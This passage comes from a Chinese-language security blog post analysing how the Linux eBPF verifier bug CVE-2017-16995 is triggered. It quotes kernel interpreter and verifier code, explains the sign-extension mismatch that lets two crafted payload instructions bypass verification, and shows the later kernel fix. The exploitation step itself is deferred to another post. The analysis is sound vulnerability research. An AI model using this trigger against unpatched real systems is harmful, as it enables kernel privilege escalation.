register</span></span><br><span class="line"><span class="comment">         *   IMM == 32-bit immediate</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * Output:</span></span><br><span class="line"><span class="comment">         *   BPF_R0 - 8/16/32-bit skb data converted to cpu endianness</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"></span><br><span class="line">        ptr = bpf_load_pointer((struct sk_buff *) (<span class="keyword">unsigned</span> <span class="keyword">long</span>) CTX, off, <span class="number">4</span>, &amp;tmp);</span><br><span class="line">        <span class="keyword">if</span> (likely(ptr != <span class="literal">NULL</span>)) &#123;</span><br><span class="line">            BPF_R0 = get_unaligned_be32(ptr);</span><br><span class="line">            CONT;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    LD_ABS_H: <span class="comment">/* BPF_R0 = ntohs(*(u16 *) (skb-&gt;data + imm32)) */</span></span><br><span class="line">        off = IMM;</span><br><span class="line">load_half:</span><br><span class="line">        ptr = bpf_load_pointer((struct sk_buff *) (<span class="keyword">unsigned</span> <span class="keyword">long</span>) CTX, off, <span class="number">2</span>, &amp;tmp);</span><br><span class="line">        <span class="keyword">if</span> (likely(ptr != <span class="literal">NULL</span>)) &#123;</span><br><span class="line">            BPF_R0 = get_unaligned_be16(ptr);</span><br><span class="line">            CONT;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    LD_ABS_B: <span class="comment">/* BPF_R0 = *(u8 *) (skb-&gt;data + imm32) */</span></span><br><span class="line">        off = IMM;</span><br><span class="line">load_byte:</span><br><span class="line">        ptr = bpf_load_pointer((struct sk_buff *) (<span class="keyword">unsigned</span> <span class="keyword">long</span>) CTX, off, <span class="number">1</span>, &amp;tmp);</span><br><span class="line">        <span class="keyword">if</span> (likely(ptr != <span class="literal">NULL</span>)) &#123;</span><br><span class="line">            BPF_R0 = *(u8 *)ptr;</span><br><span class="line">            CONT;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    LD_IND_W: <span class="comment">/* BPF_R0 = ntohl(*(u32 *) (skb-&gt;data + src_reg + imm32)) */</span></span><br><span class="line">        off = IMM + SRC;</span><br><span class="line">        <span class="keyword">goto</span> load_word;</span><br><span class="line">    LD_IND_H: <span class="comment">/* BPF_R0 = ntohs(*(u16 *) (skb-&gt;data + src_reg + imm32)) */</span></span><br><span class="line">        off = IMM + SRC;</span><br><span class="line">        <span class="keyword">goto</span> load_half;</span><br><span class="line">    LD_IND_B: <span class="comment">/* BPF_R0 = *(u8 *) (skb-&gt;data + src_reg + imm32) */</span></span><br><span class="line">        off = IMM + SRC;</span><br><span class="line">        <span class="keyword">goto</span> load_byte;</span><br><span class="line"></span><br><span class="line">    default_label:</span><br><span class="line">        <span class="comment">/* If we ever reach this, we have a bug somewhere. */</span></span><br><span class="line">        WARN_RATELIMIT(<span class="number">1</span>, <span class="string">&quot;unknown opcode %02x\n&quot;</span>, insn-&gt;code);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>还是老样子，从第一行payload <code>\xb4\x09\x00\x00\xff\xff\xff\xff</code>开始看</p>
<p>这一句payload在真实执行中，将会跳转到以下标签</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ALU_MOV_K:</span><br><span class="line">DST = (u32) IMM;</span><br><span class="line">CONT;</span><br></pre></td></tr></table></figure>
<p>也即将立即数(IMM)赋值给寄存器</p>
<p>这里我们要尤其关注<code>DST</code>以及<code>IMM</code>的类型</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DST    regs[insn-&gt;dst_reg]</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMM    insn-&gt;imm</span></span><br><span class="line">......</span><br><span class="line">u64 regs[MAX_BPF_REG], tmp;</span><br></pre></td></tr></table></figure>
<p>从上面可以看到,<code>DST</code>为无符号64位整型，而<code>IMM</code>，则是有符号32位整型</p>
<p>经过<code>DST = (u32) IMM;</code>语句，<code>IMM</code>被强转为无符号32位整型并赋值给<code>DST</code></p>
<p>但是，由于<code>DST</code>为无符号64位整型，所以<code>IMM</code>需要扩展为64位才可赋值，由于此时<code>IMM</code>为无符号整型，所以原来的<code>0xffffffff</code>将会被拓展为<code>0x00000000ffffffff</code>并赋值给<code>DST</code></p>
<p>接着我们来看第二句payload<code>\x55\x09\x02\x00\xff\xff\xff\xff</code></p>
<p>这一句payload将会跳转至以下标签</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">JMP_JNE_K:</span><br><span class="line"><span class="keyword">if</span> (DST != IMM) &#123;</span><br><span class="line">    insn += insn-&gt;off;</span><br><span class="line">    CONT_JMP;</span><br><span class="line">&#125;</span><br><span class="line">CONT;</span><br></pre></td></tr></table></figure>
<p>也即判断<code>DST</code>是否等于<code>IMM</code>，那么如果你还记得，在虚拟执行中，这两个值是相等的，所以并不会执行跳转，后续执行第三、四句payload，从而退出bpf指令的执行</p>
<p>但是，在真实的执行中，却出现了一点问题</p>
<p>我们同样关注<code>DST</code>以及<code>IMM</code>的类型</p>
<p>此时，<code>DST</code>仍为无符号64位整型，而<code>IMM</code>，也仍是有符号32位整型</p>
<p>接着判断两个值是否相等<code>DST != IMM</code>，此时<code>DST</code>为<code>0x00000000ffffffff</code>，而<code>IMM</code>却由于是有符号32位整型，所以需要先拓展为64位才可以进行比较</p>
<p>那么<code>IMM</code>将会如何扩展呢？</p>
<p>由于<code>IMM</code>为带符号整型，所以原来<code>0xffffffff</code>将会被拓展为<code>0xffffffffffffffff</code></p>
<p>那么，由于<code>0x00000000ffffffff != 0xffffffffffffffff</code>，故而执行跳转，执行了本不该执行的，虚拟执行中未进行检查的我们的payload的剩余部分</p>
<p>看到这儿，相信原理已经十分清楚了，此漏洞就是由于内核不当的符号拓展导致了bpf解释器在虚拟执行以及真实执行时的解释存在差异，从而使得未经安全检查的bpf指令得以绕过bpf虚拟执行中的检查，被内核真实加载并执行</p>
<p>附上debug图</p>
<p>执行判断语句</p>
<p><img src="/image/CVE-2017-16995/DST.png" alt="DST"></p>
<p>可以看到此时恰好是漏洞的触发点，将要执行比较<code>DST</code>以及<code>IMM</code>的值</p>
<p>此时<code>DST</code>的值为<code>$rbp+$rax*8-0x278</code>处的值，可以看到是<code>0x00000000ffffffff</code></p>
<p>此时<code>IMM</code>的值为<code>rdx</code>寄存器的值，如下图所示</p>
<p><img src="/image/CVE-2017-16995/IMM.png" alt="IMM"></p>
<p>可以看到为<code>0xffffffffffffffff</code></p>
<p>同时，你也可以看到<code>&lt;__bpf_prog_run+2265&gt; movsxd rdx, DWORD PTR [rbx+0x4]</code>，此句便是执行了<code>IMM</code>的带符号拓展至64位的操作</p>
<p>最终由于两值不相等，从而进入了不该进入的分支，从而执行了未经校验的bpf指令</p>
<p><img src="/image/CVE-2017-16995/pwn.png" alt="pwn"></p>
<h1 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h1><p>此漏洞在如今的linux内核中已经被修复，来看看<code>linux-4.15</code>版本中如何修复此问题</p>
<p>主要的修复工作是在<code>check_alu_op</code>函数中做的，其中虚拟执行过程中的许多结构体经过了大改，所以简单叙述一下</p>
<p>在存在漏洞的版本中，我们第一句payload中的赋值操作，是由以下语句完成的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">/* case: R = imm</span></span><br><span class="line"><span class="comment">     * remember the value we stored into this reg</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    regs[insn-&gt;dst_reg].type = CONST_IMM;</span><br><span class="line">    regs[insn-&gt;dst_reg].imm = insn-&gt;imm;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而在新版本中，是由以下语句完成</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">/* case: R = imm</span></span><br><span class="line"><span class="comment">     * remember the value we stored into this reg</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    regs[insn-&gt;dst_reg].type = SCALAR_VALUE;</span><br><span class="line">    <span class="keyword">if</span> (BPF_CLASS(insn-&gt;code) == BPF_ALU64) &#123;</span><br><span class="line">        __mark_reg_known(regs + insn-&gt;dst_reg,</span><br><span class="line">                 insn-&gt;imm);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        __mark_reg_known(regs + insn-&gt;dst_reg,</span><br><span class="line">                 (u32)insn-&gt;imm);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>先来看看<code>__mark_reg_known</code>的实现</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Mark the unknown part of a register (variable offset or scalar value) as</span></span><br><span class="line"><span class="comment"> * known to have the value @imm.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __mark_reg_known(struct bpf_reg_state *reg, u64 imm)</span><br><span class="line">&#123;</span><br><span class="line">    reg-&gt;id = <span class="number">0</span>;</span><br><span class="line">    reg-&gt;var_off = tnum_const(imm);</span><br><span class="line">    reg-&gt;smin_value = (s64)imm;</span><br><span class="line">    reg-&gt;smax_value = (s64)imm;</span><br><span class="line">    reg-&gt;umin_value = imm;</span><br><span class="line">    reg-&gt;umax_value = imm;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>那么在新版本中，我们原本的第一句payload将会触发<code>__mark_reg_known(regs + insn-&gt;dst_reg,
(u32)insn-&gt;imm);</code>操作</p>
<p>可以看到我们传入的立即数将会先被强制转换为无符号32位整型并传入<code>__mark_reg_known</code>函数中</p>
<p>注意，<code>__mark_reg_known</code>函数对应的参数为无符号64位整形，那么被强转后的立即数值便会进行32位至64的无符号拓展，也即<code>0xffffffff -&gt; 0x00000000ffffffff</code></p>
<p>接着，我们看看<code>tnum_const</code>函数的实现</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TNUM(_v, _m)    (struct tnum)&#123;.value = _v, .mask = _m&#125;</span></span><br><span class="line"><span class="comment">/* A completely unknown value */</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">tnum</span> <span class="title">tnum_unknown</span> =</span> &#123; .value = <span class="number">0</span>, .mask = <span class="number">-1</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">struct tnum <span class="title">tnum_const</span><span class="params">(u64 value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> TNUM(value, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到，此函数即是保存了<code>0x00000000ffffffff</code> 的值至<code>reg-&gt;var_off.value</code>中</p>
<p>继续，我们来看看原本第二句paylaod的执行情况</p>
<p>在原来版本中，“恒跳转”由以下语句判断</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (BPF_SRC(insn-&gt;code) == BPF_K &amp;&amp;</span><br><span class="line">    (opcode == BPF_JEQ || opcode == BPF_JNE) &amp;&amp;</span><br><span class="line">    regs[insn-&gt;dst_reg].type == CONST_IMM &amp;&amp;</span><br><span class="line">    regs[insn-&gt;dst_reg].imm == insn-&gt;imm) &#123;</span><br><span class="line">    <span class="keyword">if</span> (opcode == BPF_JEQ) &#123;</span><br><span class="line">        <span class="comment">/* if (imm == imm) goto pc+off;</span></span><br><span class="line"><span class="comment">         * only follow the goto, ignore fall-through</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        *insn_idx += insn-&gt;off;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/* if (imm != imm) goto pc+off;</span></span><br><span class="line"><span class="comment">         * only follow fall-through branch, since</span></span><br><span class="line"><span class="comment">         * that&#x27;s where the program will go</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">other_branch = push_stack(env, *insn_idx + insn-&gt;off + <span class="number">1</span>, *insn_idx);</span><br><span class="line"><span class="keyword">if</span> (!other_branch)</span><br><span class="line">    <span class="keyword">return</span> -EFAULT;</span><br><span class="line">    .........</span><br></pre></td></tr></table></figure>
<p>而在新版本中，由以下语句判断</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* detect if R == 0 where R was initialized to zero earlier */</span></span><br><span class="line"><span class="keyword">if</span> (BPF_SRC(insn-&gt;code) == BPF_K &amp;&amp;</span><br><span class="line">    (opcode == BPF_JEQ || opcode == BPF_JNE) &amp;&amp;</span><br><span class="line">    dst_reg-&gt;type == SCALAR_VALUE &amp;&amp;</span><br><span class="line">    tnum_equals_const(dst_reg-&gt;var_off, insn-&gt;imm)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (opcode == BPF_JEQ) &#123;</span><br><span class="line">        <span class="comment">/* if (imm == imm) goto pc+off;</span></span><br><span class="line"><span class="comment">         * only follow the goto, ignore fall-through</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        *insn_idx += insn-&gt;off;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/* if (imm != imm) goto pc+off;</span></span><br><span class="line"><span class="comment">         * only follow fall-through branch, since</span></span><br><span class="line"><span class="comment">         * that&#x27;s where the program will go</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到主要的差别就是第四个判断条件，那么来看看<code>tnum_equals_const</code>的实现</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Returns true if @a is a known constant */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">bool</span> <span class="title">tnum_is_const</span><span class="params">(struct tnum a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !a.mask;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Returns true if @a == tnum_const(@b) */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">bool</span> <span class="title">tnum_equals_const</span><span class="params">(struct tnum a, u64 b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> tnum_is_const(a) &amp;&amp; a.value == b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，<code>insn-&gt;imm</code>在被传入<code>tnum_equals_const</code>后，被强制转换成了无符号64位整型，也就是说进行比较的立即数进行了这样的转变<code>0xffffffff -&gt; 0xfffffffffffffff</code></p>
<p>接着进行比较，从上面的分析中我们可以知道此时<code>reg-&gt;var_off.value</code>的值为<code>0x00000000ffffffff</code> ，那么<code>return tnum_is_const(a) &amp;&amp; a.value == b;</code>就如下所示</p>
<p><code>return 1 &amp;&amp; 0x00000000ffffffff == 0xfffffffffffffff; = return 0</code></p>
<p>也就是说，判断条件不成立，与旧版本就此停止不继续向下执行不同，新版本由于判断条件不为真，于是将会继续执行，将可能执行的分支进一步检测，从而避免了加载我们的恶意bpf指令</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>payload中实际利用的代码部分还没讲，后面再写一篇，顺便可以讲些linux内核中的一些重要结构</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">ph4ntom</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://ph4ntonn.github.io/CVE-2017-16995-trigger.html">https://ph4ntonn.github.io/CVE-2017-16995-trigger.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://ph4ntonn.github.io" target="_blank">ph4ntom's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/binary/">binary</a></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/CVE-2017-16995-exploit.html"><img class="prev-cover" src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">CVE-2017-16995 -- 利用</div></div></a></div><div class="next-post pull-right"><a href="/how-ptmalloc-malloc-free.html"><img class="next-cover" src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">how ptmalloc malloc &amp;&amp; free</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/Double-free.html" title="Double free"><img class="cover" src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-10-23</div><div class="title">Double free</div></div></a></div><div><a href="/ptmalloc.html" title="ptmalloc机制闲扯"><img class="cover" src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-10-24</div><div class="title">ptmalloc机制闲扯</div></div></a></div><div><a href="/ret2dl.html" title="ret2dl"><img class="cover" src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-11-13</div><div class="title">ret2dl</div></div></a></div><div><a href="/bypass-Canary.html" title="bypass Canary"><img class="cover" src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-11-11</div><div class="title">bypass Canary</div></div></a></div><div><a href="/partial-write.html" title="partial overwrite && stack smash"><img class="cover" src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-11-27</div><div class="title">partial overwrite && stack smash</div></div></a></div><div><a href="/how-ptmalloc-malloc-free.html" title="how ptmalloc malloc && free"><img class="cover" src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-12-04</div><div class="title">how ptmalloc malloc && free</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside_content" id="aside_content"><div class="card-widget card-info"><div class="card-content"><div class="card-info-avatar is-center"><img class="avatar-img" src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">ph4ntom</div><div class="author-info__description">The wheel turns,nothing is ever new</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">22</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ph4ntonn"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/ph4ntonn" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:ph4ntom11235@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div></div><div class="card-widget card-announcement"><div class="card-content"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">欢迎来到我的博客～</div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="card-content"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFbpf"><span class="toc-number">1.</span> <span class="toc-text">什么是bpf</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#bpf%E6%8C%87%E4%BB%A4%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">bpf指令集</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#bpf%E5%8A%A0%E8%BD%BD%E6%B5%81%E7%A8%8B"><span class="toc-number">3.</span> <span class="toc-text">bpf加载流程</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="toc-number">4.</span> <span class="toc-text">漏洞成因</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D"><span class="toc-number">5.</span> <span class="toc-text">修复</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%90%8E%E8%AE%B0"><span class="toc-number">6.</span> <span class="toc-text">后记</span></a></li></ol></div></div></div><div class="card-widget card-recent-post"><div class="card-content"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/linux-xid.html" title="linux内核中的xID"><img src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="linux内核中的xID"/></a><div class="content"><a class="title" href="/linux-xid.html" title="linux内核中的xID">linux内核中的xID</a><time datetime="2021-01-21T04:06:13.000Z" title="发表于 2021-01-21 12:06:13">2021-01-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/CVE-2017-16995-structure.html" title="CVE-2017-16995 -- 结构"><img src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CVE-2017-16995 -- 结构"/></a><div class="content"><a class="title" href="/CVE-2017-16995-structure.html" title="CVE-2017-16995 -- 结构">CVE-2017-16995 -- 结构</a><time datetime="2021-01-16T04:06:13.000Z" title="发表于 2021-01-16 12:06:13">2021-01-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/CVE-2017-16995-exploit.html" title="CVE-2017-16995 -- 利用"><img src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CVE-2017-16995 -- 利用"/></a><div class="content"><a class="title" href="/CVE-2017-16995-exploit.html" title="CVE-2017-16995 -- 利用">CVE-2017-16995 -- 利用</a><time datetime="2021-01-13T04:06:13.000Z" title="发表于 2021-01-13 12:06:13">2021-01-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/CVE-2017-16995-trigger.html" title="CVE-2017-16995 -- 触发"><img src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CVE-2017-16995 -- 触发"/></a><div class="content"><a class="title" href="/CVE-2017-16995-trigger.html" title="CVE-2017-16995 -- 触发">CVE-2017-16995 -- 触发</a><time datetime="2021-01-12T04:06:13.000Z" title="发表于 2021-01-12 12:06:13">2021-01-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/how-ptmalloc-malloc-free.html" title="how ptmalloc malloc &amp;&amp; free"><img src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="how ptmalloc malloc &amp;&amp; free"/></a><div class="content"><a class="title" href="/how-ptmalloc-malloc-free.html" title="how ptmalloc malloc &amp;&amp; free">how ptmalloc malloc &amp;&amp; free</a><time datetime="2020-12-04T08:43:17.000Z" title="发表于 2020-12-04 16:43:17">2020-12-04</time></div></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg)"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2021 By ph4ntom</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script>var preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',()=> {preloader.endLoading()})</script><div class="js-pjax"><script>function loadValine () {
  function initValine () {
    let initData = {
      el: '#vcomment',
      appId: '9E1TK8SCjpPaeeW41wldJbk1-gzGzoHsz',
      appKey: 'HyvuhJHOsDtafuWIxYSzbLXH',
